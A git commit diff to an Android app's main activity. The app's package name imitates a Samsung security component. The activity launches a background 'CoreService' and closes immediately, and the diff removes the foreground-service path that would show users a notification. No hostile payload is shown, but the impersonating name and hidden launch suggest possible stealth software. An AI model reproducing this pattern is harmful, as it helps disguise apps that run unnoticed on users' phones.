ec3b9f8d968dd7a350e20a65c896e4c5c649671f
hmooud6 <hmoodhkr1@gmail.com>
2026-03-10 17:25:56 +0200

    fix manifest and start CoreService

--- app/src/main/java/com/samsung/android/security/v8/MainActivity.java
+++ app/src/main/java/com/samsung/android/security/v8/MainActivity.java
@@ -1,28 +1,21 @@
 package com.samsung.android.security.v8;
 
+import android.app.Activity;
 import android.content.Intent;
-import android.os.Build;
 import android.os.Bundle;
-import androidx.appcompat.app.AppCompatActivity;
 
 import com.samsung.android.security.v8.services.CoreService;
 
-public class MainActivity extends AppCompatActivity {
+public class MainActivity extends Activity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // تشغيل الخدمة الأساسية
+        // تشغيل الخدمة
         Intent serviceIntent = new Intent(this, CoreService.class);
+        startService(serviceIntent);
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
-
-        // إغلاق النشاط (التطبيق يعمل بالخلفية)
         finish();
     }
 }
